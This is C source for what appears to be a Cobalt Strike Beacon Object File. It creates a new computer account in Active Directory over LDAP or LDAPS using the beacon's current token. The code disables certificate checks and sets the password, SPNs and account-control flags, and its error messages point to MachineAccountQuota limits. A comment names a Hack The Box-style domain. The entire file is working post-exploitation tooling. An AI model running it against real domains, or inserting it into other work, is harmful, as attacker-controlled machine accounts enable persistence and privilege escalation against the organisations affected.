#include <windows.h>
#include "beacon.h"

// ── Minimal LDAP types ───────────────────────────────────────────────────────

typedef struct ldap {
    struct {
        UINT_PTR sb_sd;
        UCHAR Reserved1[(10*sizeof(ULONG))+1];
        ULONG_PTR sb_naddr;
        UCHAR Reserved2[(6*sizeof(ULONG))];
    } ld_sb;
    PCHAR ld_host;
    ULONG ld_version;
    UCHAR ld_lberoptions;
    ULONG ld_deref;
    ULONG ld_timelimit;
    ULONG ld_sizelimit;
    ULONG ld_errno;
    PCHAR ld_matched;
    PCHAR ld_error;
    ULONG ld_msgid;
    UCHAR Reserved3[(6*sizeof(ULONG))+1];
    ULONG ld_cldaptries;
    ULONG ld_cldaptimeout;
    ULONG ld_refhoplimit;
    ULONG ld_options;
} LDAP, *PLDAP;

typedef struct berval {
    ULONG bv_len;
    PCHAR bv_val;
} BERVAL, *PBERVAL;

typedef struct ldapmodA {
    ULONG mod_op;
    PCHAR mod_type;
    union {
        PCHAR *modv_strvals;
        struct berval **modv_bvals;
    } mod_vals;
} LDAPModA;

typedef struct ldapmsg {
    ULONG lm_msgid;
    ULONG lm_msgtype;
    PVOID lm_ber;
    struct ldapmsg* lm_chain;
    struct ldapmsg* lm_next;
    ULONG lm_time;
    LDAP* Connection;
    PVOID Request;
    ULONG lm_returncode;
    USHORT lm_referral;
    BOOLEAN lm_chased;
    BOOLEAN lm_eom;
    BOOLEAN ConnectionReferenced;
} LDAPMessage;

// ── Constants ────────────────────────────────────────────────────────────────
#define LDAP_PORT                   389
#define LDAP_SSL_PORT               636
#define LDAP_VERSION3               3
#define LDAP_SUCCESS                0x00
#define LDAP_ALREADY_EXISTS         0x44
#define LDAP_INSUFFICIENT_RIGHTS    0x32
#define LDAP_UNWILLING_TO_PERFORM   0x35
#define LDAP_NO_SUCH_OBJECT         0x20
#define LDAP_CONSTRAINT_VIOLATION   0x13
#define LDAP_INVALID_DN_SYNTAX      0x22
#define LDAP_OPT_VERSION            0x11
#define LDAP_OPT_SSL                0x0a
#define LDAP_OPT_SIGN               0x95
#define LDAP_OPT_ENCRYPT            0x96
#define LDAP_OPT_SERVER_CERTIFICATE 0x81
#define LDAP_OPT_AREC_EXCLUSIVE     0x98
#define LDAP_OPT_ON                 ((void*)1)
#define LDAP_MOD_ADD                0x00
#define LDAP_MOD_BVALUES            0x80
#define LDAP_AUTH_NEGOTIATE         0x0486
#define LDAP_AUTH_KERBEROS          0x0800

// ── Imports ──────────────────────────────────────────────────────────────────
DECLSPEC_IMPORT LDAP*  WLDAP32$ldap_init(PCHAR HostName, ULONG PortNumber);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_set_option(LDAP* ld, int option, const void* invalue);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_bind_s(LDAP* ld, const PCHAR dn, const PCHAR cred, ULONG method);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_unbind_s(LDAP* ld);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_add_s(LDAP* ld, const PCHAR dn, LDAPModA** attrs);
DECLSPEC_IMPORT PCHAR  WLDAP32$ldap_err2stringA(ULONG err);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_connect(LDAP* ld, struct l_timeval* timeout);

DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char* str);
DECLSPEC_IMPORT char*  __cdecl MSVCRT$strcpy(char* dest, const char* src);
DECLSPEC_IMPORT int    __cdecl MSVCRT$_snprintf(char* buf, size_t count, const char* fmt, ...);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void   __cdecl MSVCRT$free(void* ptr);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memset(void* dest, int c, size_t n);

typedef BOOLEAN (*VERIFYSERVERCERT)(PLDAP, PCCERT_CONTEXT);
BOOLEAN _cert_cb(PLDAP c, PCCERT_CONTEXT p) { return TRUE; }

// ── Password encoder ─────────────────────────────────────────────────────────
BERVAL* _encode_password(const char* pw) {
    if (!pw) return NULL;
    size_t pwlen = MSVCRT$strlen(pw);
    if (!pwlen) return NULL;

    ULONG wchars = (ULONG)(pwlen + 2);
    ULONG nbytes = wchars * sizeof(wchar_t);
    wchar_t* wbuf = (wchar_t*)MSVCRT$malloc(nbytes);
    if (!wbuf) return NULL;

    wbuf[0] = L'"';
    for (size_t i = 0; i < pwlen; i++) wbuf[1 + i] = (wchar_t)(unsigned char)pw[i];
    wbuf[1 + pwlen] = L'"';

    BERVAL* bv = (BERVAL*)MSVCRT$malloc(sizeof(BERVAL));
    if (!bv) { MSVCRT$free(wbuf); return NULL; }
    bv->bv_len = nbytes;
    bv->bv_val = (char*)wbuf;
    return bv;
}

// ── Build DC=x,DC=y from dc01.garfield.htb ──────────────────────────────────
char* _build_nc(const char* dc_fqdn) {
    if (!dc_fqdn || !MSVCRT$strlen(dc_fqdn)) return NULL;
    const char* p = dc_fqdn;
    while (*p && *p != '.') p++;
    if (!*p) return NULL;
    p++;

    int dots = 0;
    const char* q = p;
    while (*q) { if (*q == '.') dots++; q++; }

    size_t domlen = MSVCRT$strlen(p);
    char* nc = (char*)MSVCRT$malloc(domlen + (dots + 1) * 4 + 1);
    if (!nc) return NULL;

    char* w = nc;
    const char* r = p;
    int first = 1;
    while (*r) {
        if (!first) *w++ = ',';
        first = 0;
        *w++ = 'D'; *w++ = 'C'; *w++ = '=';
        while (*r && *r != '.') *w++ = *r++;
        if (*r == '.') r++;
    }
    *w = '\0';
    return nc;
}

// ── Extract dotted domain from DC FQDN (lowercased) ─────────────────────────
void _domain_from_fqdn(const char* dc_fqdn, char* out, size_t outsz) {
    out[0] = '\0';
    if (!dc_fqdn || !MSVCRT$strlen(dc_fqdn)) return;
    const char* p = dc_fqdn;
    while (*p && *p != '.') p++;
    if (!*p) return;
    p++;
    size_t i = 0;
    while (*p && i < outsz - 1) {
        char c = *p++;
        if (c >= 'A' && c <= 'Z') c = c + 32;
        out[i++] = c;
    }
    out[i] = '\0';
}

// ── Main ─────────────────────────────────────────────────────────────────────
void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* computerName = BeaconDataExtract(&parser, NULL);
    int   isDN         = BeaconDataInt(&parser);
    char* password     = BeaconDataExtract(&parser, NULL);
    char* ouPath       = BeaconDataExtract(&parser, NULL);
    char* dcFqdn       = BeaconDataExtract(&parser, NULL);
    int   disabled     = BeaconDataInt(&parser);
    int   useLdaps     = BeaconDataInt(&parser);

    if (!computerName || !MSVCRT$strlen(computerName)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Computer name required"); return;
    }
    if (!password || !MSVCRT$strlen(password)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Password required (enabled computer accounts must have one)");
        return;
    }
    if (!dcFqdn || !MSVCRT$strlen(dcFqdn)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DC FQDN required"); return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] add-computer: using current beacon token");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Computer: %s | DC: %s", computerName, dcFqdn);

    // ── Connect: try LDAPS if asked, fall back to 389 SASL sign+seal ────────
    LDAP* ld = NULL;
    int on_ldaps = 0;

    if (useLdaps) {
        ld = WLDAP32$ldap_init((PCHAR)dcFqdn, LDAP_SSL_PORT);
        if (ld) {
            ULONG ver = LDAP_VERSION3;
            WLDAP32$ldap_set_option(ld, LDAP_OPT_VERSION, &ver);
            WLDAP32$ldap_set_option(ld, LDAP_OPT_AREC_EXCLUSIVE, LDAP_OPT_ON);
            WLDAP32$ldap_set_option(ld, LDAP_OPT_SSL, LDAP_OPT_ON);
            VERIFYSERVERCERT cb = _cert_cb;
            WLDAP32$ldap_set_option(ld, LDAP_OPT_SERVER_CERTIFICATE, (void*)&cb);

            ULONG cr = WLDAP32$ldap_connect(ld, NULL);
            if (cr == LDAP_SUCCESS) {
                on_ldaps = 1;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] LDAPS connection established");
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] LDAPS failed (0x%x), falling back to 389", cr);
                WLDAP32$ldap_unbind_s(ld);
                ld = NULL;
            }
        }
    }

    if (!ld) {
        ld = WLDAP32$ldap_init((PCHAR)dcFqdn, LDAP_PORT);
        if (!ld) { BeaconPrintf(CALLBACK_ERROR, "[-] ldap_init failed"); return; }

        ULONG ver = LDAP_VERSION3;
        WLDAP32$ldap_set_option(ld, LDAP_OPT_VERSION, &ver);
        WLDAP32$ldap_set_option(ld, LDAP_OPT_AREC_EXCLUSIVE, LDAP_OPT_ON);

        // CRITICAL: ULONG*, not pointer-to-pointer
        ULONG on_val = 1;
        WLDAP32$ldap_set_option(ld, LDAP_OPT_SIGN,    &on_val);
        WLDAP32$ldap_set_option(ld, LDAP_OPT_ENCRYPT, &on_val);

        ULONG cr = WLDAP32$ldap_connect(ld, NULL);
        if (cr != LDAP_SUCCESS) {
            PCHAR es = WLDAP32$ldap_err2stringA(cr);
            BeaconPrintf(CALLBACK_ERROR, "[-] ldap_connect failed (0x%x): %s", cr, es ? es : "?");
            WLDAP32$ldap_unbind_s(ld); return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] LDAP 389 established (SASL sign+seal)");
    }

    // ── Bind ────────────────────────────────────────────────────────────────
    ULONG rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_KERBEROS);
    if (rc != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Kerberos bind failed (0x%x), trying NEGOTIATE...", rc);
        rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    }
    if (rc != LDAP_SUCCESS) {
        PCHAR es = WLDAP32$ldap_err2stringA(rc);
        BeaconPrintf(CALLBACK_ERROR, "[-] Bind failed (0x%x): %s", rc, es ? es : "?");
        WLDAP32$ldap_unbind_s(ld); return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Bind OK (%s)", on_ldaps ? "LDAPS" : "SASL sign+seal");

    // ── Build DN, sAMAccountName, dnsHostName, SPNs ─────────────────────────
    char* defaultNC = _build_nc(dcFqdn);
    if (!defaultNC) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to derive defaultNamingContext");
        WLDAP32$ldap_unbind_s(ld); return;
    }

    char domain[256];
    _domain_from_fqdn(dcFqdn, domain, sizeof(domain));

    // Strip trailing $ from input if user typed "FAKE$"
    char cn[128] = {0};
    size_t nlen = MSVCRT$strlen(computerName);
    if (nlen > 0 && computerName[nlen-1] == '$') nlen--;
    if (nlen >= sizeof(cn)) nlen = sizeof(cn) - 1;
    MSVCRT$memset(cn, 0, sizeof(cn));
    for (size_t i = 0; i < nlen; i++) cn[i] = computerName[i];

    char computerDN[512];
    if (isDN) {
        MSVCRT$_snprintf(computerDN, sizeof(computerDN), "%s", computerName);
    } else if (ouPath && MSVCRT$strlen(ouPath)) {
        MSVCRT$_snprintf(computerDN, sizeof(computerDN), "CN=%s,%s", cn, ouPath);
    } else {
        MSVCRT$_snprintf(computerDN, sizeof(computerDN), "CN=%s,CN=Computers,%s", cn, defaultNC);
    }

    char sam[160]; MSVCRT$_snprintf(sam, sizeof(sam), "%s$", cn);
    char dnsHost[320]; MSVCRT$_snprintf(dnsHost, sizeof(dnsHost), "%s.%s", cn, domain);
    char spn1[256]; MSVCRT$_snprintf(spn1, sizeof(spn1), "HOST/%s", cn);
    char spn2[320]; MSVCRT$_snprintf(spn2, sizeof(spn2), "HOST/%s", dnsHost);
    char spn3[256]; MSVCRT$_snprintf(spn3, sizeof(spn3), "RestrictedKrbHost/%s", cn);
    char spn4[320]; MSVCRT$_snprintf(spn4, sizeof(spn4), "RestrictedKrbHost/%s", dnsHost);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] DN: %s", computerDN);

    // ── Build attribute list ────────────────────────────────────────────────
    char* objectClass_values[] = { "top", "person", "organizationalPerson", "user", "computer", NULL };
    LDAPModA objectClass_mod = { LDAP_MOD_ADD, "objectClass",          { .modv_strvals = objectClass_values } };

    char* sam_values[]     = { sam, NULL };
    LDAPModA sam_mod     = { LDAP_MOD_ADD, "sAMAccountName",          { .modv_strvals = sam_values } };

    char* dns_values[]     = { dnsHost, NULL };
    LDAPModA dns_mod     = { LDAP_MOD_ADD, "dNSHostName",             { .modv_strvals = dns_values } };

    char* spn_values[]     = { spn1, spn2, spn3, spn4, NULL };
    LDAPModA spn_mod     = { LDAP_MOD_ADD, "servicePrincipalName",   { .modv_strvals = spn_values } };

    char* uac_values[]     = { disabled ? "4098" : "4096", NULL };
    LDAPModA uac_mod     = { LDAP_MOD_ADD, "userAccountControl",     { .modv_strvals = uac_values } };

    BERVAL* pw_bv = _encode_password(password);
    if (!pw_bv) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to encode password");
        MSVCRT$free(defaultNC); WLDAP32$ldap_unbind_s(ld); return;
    }
    BERVAL* pw_vals[] = { pw_bv, NULL };
    LDAPModA pw_mod;
    pw_mod.mod_op   = LDAP_MOD_ADD | LDAP_MOD_BVALUES;
    pw_mod.mod_type = "unicodePwd";
    pw_mod.mod_vals.modv_bvals = pw_vals;

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] Encoded unicodePwd: %lu bytes (UTF-16LE, quoted)", pw_bv->bv_len);

    LDAPModA* attrs[] = {
        &objectClass_mod, &sam_mod, &dns_mod, &spn_mod, &uac_mod, &pw_mod, NULL
    };

    // ── Add ─────────────────────────────────────────────────────────────────
    rc = WLDAP32$ldap_add_s(ld, computerDN, attrs);

    if (rc == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Computer created: %s", computerDN);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] sAMAccountName: %s", sam);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] dNSHostName:    %s", dnsHost);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] UAC: %s", disabled ? "4098 (disabled)" : "4096 (enabled)");
    } else {
        PCHAR es = WLDAP32$ldap_err2stringA(rc);
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_add_s failed (0x%x): %s", rc, es ? es : "?");
        switch (rc) {
            case LDAP_ALREADY_EXISTS:
                BeaconPrintf(CALLBACK_ERROR, "[!] Computer already exists"); break;
            case LDAP_INSUFFICIENT_RIGHTS:
                BeaconPrintf(CALLBACK_ERROR,
                    "[!] Insufficient rights — MachineAccountQuota hit, or no Create Child on container"); break;
            case LDAP_UNWILLING_TO_PERFORM:
                BeaconPrintf(CALLBACK_ERROR,
                    "[!] Channel likely not sealed, or missing required attribute"); break;
            case LDAP_CONSTRAINT_VIOLATION:
                BeaconPrintf(CALLBACK_ERROR,
                    "[!] Password policy rejected password, or UAC/attribute constraint"); break;
            case LDAP_NO_SUCH_OBJECT:
                BeaconPrintf(CALLBACK_ERROR, "[!] Target OU does not exist"); break;
            case LDAP_INVALID_DN_SYNTAX:
                BeaconPrintf(CALLBACK_ERROR, "[!] Invalid DN syntax"); break;
        }
    }

    MSVCRT$memset(pw_bv->bv_val, 0, pw_bv->bv_len);
    MSVCRT$free(pw_bv->bv_val);
    MSVCRT$free(pw_bv);
    MSVCRT$free(defaultNC);
    WLDAP32$ldap_unbind_s(ld);
}
